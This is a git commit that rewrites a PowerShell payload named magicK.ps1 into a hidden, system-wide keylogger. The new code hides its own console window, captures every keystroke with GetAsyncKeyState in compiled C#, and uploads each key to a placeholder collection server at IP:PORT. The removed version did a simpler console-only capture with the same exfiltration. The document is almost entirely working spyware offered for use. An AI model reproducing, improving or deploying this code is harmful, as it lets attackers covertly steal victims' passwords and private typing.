daa9e427f47b5b24f63596246fda430e95bd7f76
azuk4r <102126589+azuk4r@users.noreply.github.com>
2024-09-20 13:36:39 +0200

    magicK fullsystem

--- payloads/magicK.ps1
+++ payloads/magicK.ps1
@@ -1,12 +1,52 @@
-$log="$env:temp\magickeys.txt"
-$uri="http://<SERVER_IP>:<SERVER_PORT>/collect"
-while ($true) {
-  $key=[Console]::ReadKey().Key
-	$key | Out-File -Append -FilePath $log
-	if ((Get-Item $log).Length -gt 500) {
-		$data=Get-Content -Path $log -Raw
-		Invoke-RestMethod -Uri $uri -Method Post -Body $data
-		Remove-Item $log
-	}
-	Start-Sleep -Milliseconds 100
+$hwnd = Get-Process -Id $PID | ForEach-Object { $_.MainWindowHandle }
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class WinAPI {
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    }
+"@
+[WinAPI]::ShowWindow($hwnd, 0)
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Net;
+using System.Windows.Forms;
+
+public class GlobalKeyCapture {
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+
+    public static void CaptureKeys() {
+        string filePath = Environment.GetEnvironmentVariable("temp") + "\\magicK.txt";
+        string uri = "http://IP:PORT/collect"; // needs to be automatically substituted through the api to get the full payload (ip:port)
+        if (!File.Exists(filePath)) {
+            File.Create(filePath).Close(); 
+        }
+
+        while (true) {
+            for (int i = 0; i < 255; i++) {
+                int keyState = GetAsyncKeyState(i);
+                if (keyState == 32769) {
+                    string key = ((ConsoleKey)i).ToString();
+                    File.WriteAllText(filePath, key);
+                    try {
+                        string data = File.ReadAllText(filePath);
+                        WebClient client = new WebClient();
+                        client.UploadString(uri, data);
+                        File.Delete(filePath);
+                    } catch (Exception e) {
+                        File.AppendAllText(filePath, "[ERROR] " + e.Message);
+                    }
+                }
+            }
+            System.Threading.Thread.Sleep(10);
+        }
+    }
 }
+"@ -ReferencedAssemblies 'System.Windows.Forms'
+
+[GlobalKeyCapture]::CaptureKeys()
